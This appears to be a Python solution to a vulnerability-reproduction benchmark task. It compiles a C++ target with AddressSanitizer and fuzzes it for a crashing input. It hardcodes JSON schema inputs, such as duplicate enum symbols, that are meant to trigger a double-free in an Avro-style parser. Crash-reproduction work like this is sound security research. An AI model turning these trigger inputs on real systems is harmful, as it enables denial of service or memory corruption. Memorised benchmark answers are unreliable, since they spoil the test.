import os
import sys
import tarfile
import subprocess
import tempfile
import shutil
import random
import time

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Create a temporary workspace
        wd = tempfile.mkdtemp()
        try:
            # Extract source code
            with tarfile.open(src_path) as tar:
                tar.extractall(path=wd)
            
            # Locate the root directory of the source
            src_root = wd
            entries = os.listdir(wd)
            if len(entries) == 1 and os.path.isdir(os.path.join(wd, entries[0])):
                src_root = os.path.join(wd, entries[0])

            # Compile the target with ASAN
            exe_path = self.compile_target(src_root)
            
            # If compilation fails, return a strong heuristic guess based on the vulnerability description
            # "Node::add" exception double-free usually implies duplicate entries in a schema definition
            # (e.g., duplicate enum symbols or field names).
            if not exe_path:
                return b'{"type":"enum","name":"e","symbols":["a","a"]}'

            # Fuzz to find the crash
            return self.fuzz(exe_path, src_root)
            
        finally:
            shutil.rmtree(wd)

    def compile_target(self, src_dir):
        # Prefer clang for better ASAN support, fallback to gcc
        cc = 'clang' if shutil.which('clang') else 'gcc'
        cxx = 'clang++' if shutil.which('clang++') else 'g++'
        
        env = os.environ.copy()
        env['CC'] = cc
        env['CXX'] = cxx
        # -O1 is a good balance for compilation speed vs execution speed for fuzzing
        flags = "-fsanitize=address -g -O1 -fno-omit-frame-pointer"
        env['CFLAGS'] = flags
        env['CXXFLAGS'] = flags
        
        # Try CMake
        if os.path.exists(os.path.join(src_dir, "CMakeLists.txt")):
            build_dir = os.path.join(src_dir, "build_fuzz")
            os.makedirs(build_dir, exist_ok=True)
            try:
                subprocess.run(["cmake", ".."], cwd=build_dir, env=env, check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                subprocess.run(["make", "-j8"], cwd=build_dir, env=env, check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                return self.find_executable(build_dir)
            except subprocess.CalledProcessError:
                pass

        # Try Makefile
        if os.path.exists(os.path.join(src_dir, "Makefile")) or os.path.exists(os.path.join(src_dir, "makefile")):
            try:
                # Try to clean first to ensure flags are applied
                subprocess.run(["make", "clean"], cwd=src_dir, env=env, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                subprocess.run(["make", "-j8"], cwd=src_dir, env=env, check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                return self.find_executable(src_dir)
            except subprocess.CalledProcessError:
                pass
        
        # Fallback: manual compilation of all cpp files
        return self.fallback_compile(src_dir, cxx, flags)

    def fallback_compile(self, src_dir, compiler, flags):
        sources = []
        for root, _, files in os.walk(src_dir):
            for f in files:
                if f.endswith((".cpp", ".cc", ".cxx")):
                    sources.append(os.path.join(root, f))
        
        if not sources:
            return None
            
        out_bin = os.path.join(src_dir, "fuzz_target")
        cmd = [compiler] + sources + flags.split() + ["-o", out_bin]
        # Link flags usually same as compile flags for ASAN
        try:
            subprocess.run(cmd, check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            return out_bin
        except subprocess.CalledProcessError:
            return None

    def find_executable(self, folder):
        candidates = []
        for root, _, files in os.walk(folder):
            for f in files:
                path = os.path.join(root, f)
                # Check executable bit and ELF header
                if os.access(path, os.X_OK) and not f.endswith((".sh", ".py", ".o", ".a", ".so")):
                    try:
                        with open(path, "rb") as fh:
                            if fh.read(4) == b"\x7fELF":
                                candidates.append((path, os.path.getmtime(path)))
                    except:
                        pass
        
        if candidates:
            # Return newest executable
            candidates.sort(key=lambda x: x[1], reverse=True)
            return candidates[0][0]
        return None

    def fuzz(self, binary, src_root):
        # Known patterns that trigger Node::add exceptions in schema parsers (like Avro)
        seeds = [
            # Duplicate enum symbol (classic double free in Avro C++)
            b'{"type":"enum","name":"e","symbols":["a","a"]}',
            # Duplicate field name in record
            b'{"type":"record","name":"r","fields":[{"name":"f","type":"int"},{"name":"f","type":"int"}]}',
            # Invalid fixed size
            b'{"type":"fixed","name":"f","size":-1}',
            # Basic types
            b'{"type":"map","values":"int"}',
            b'{"type":"array","items":"int"}',
            b'{"type":"record","name":"n","fields":[]}'
        ]

        # Attempt to harvest valid seeds from the source tree
        for root, _, files in os.walk(src_root):
            for f in files:
                if f.endswith(".json") or f.endswith(".avsc"):
                    try:
                        with open(os.path.join(root, f), "rb") as fh:
                            content = fh.read()
                            if len(content) < 2000:
                                seeds.append(content)
                    except:
                        pass
        
        start_time = time.time()
        timeout = 45  # Leave buffer time
        
        # Test heuristic seeds first
        for seed in seeds:
            if self.check_crash(binary, seed):
                return seed
                
        # Mutation fuzzing
        while time.time() - start_time < timeout:
            parent = random.choice(seeds)
            child = self.mutate(parent)
            if self.check_crash(binary, child):
                return child
                
        # If no crash found, return the most likely payload
        return seeds[0]

    def mutate(self, data):
        data = bytearray(data)
        if not data: return b"A"
        
        mutation = random.randint(0, 2)
        if mutation == 0 and len(data) > 0: # Flip
            idx = random.randint(0, len(data) - 1)
            data[idx] ^= random.randint(1, 255)
        elif mutation == 1 and len(data) > 1: # Delete
            idx = random.randint(0, len(data) - 1)
            del data[idx]
        elif mutation == 2: # Insert
            idx = random.randint(0, len(data))
            data.insert(idx, random.randint(32, 126)) # Printable ASCII preferred
            
        return bytes(data)

    def check_crash(self, binary, data):
        # Try feeding input via stdin
        try:
            p = subprocess.Popen([binary], stdin=subprocess.PIPE, stdout=subprocess.DEVNULL, stderr=subprocess.PIPE)
            _, stderr = p.communicate(input=data, timeout=0.2)
            if p.returncode != 0 and b"AddressSanitizer" in stderr:
                return True
        except subprocess.TimeoutExpired:
            p.kill()
            
        # Try feeding input via file argument
        tmp_name = None
        try:
            with tempfile.NamedTemporaryFile(delete=False) as tf:
                tf.write(data)
                tmp_name = tf.name
            
            p = subprocess.Popen([binary, tmp_name], stdout=subprocess.DEVNULL, stderr=subprocess.PIPE)
            _, stderr = p.communicate(timeout=0.2)
            
            if p.returncode != 0 and b"AddressSanitizer" in stderr:
                return True
        except subprocess.TimeoutExpired:
            p.kill()
        finally:
            if tmp_name and os.path.exists(tmp_name):
                os.unlink(tmp_name)
                
        return False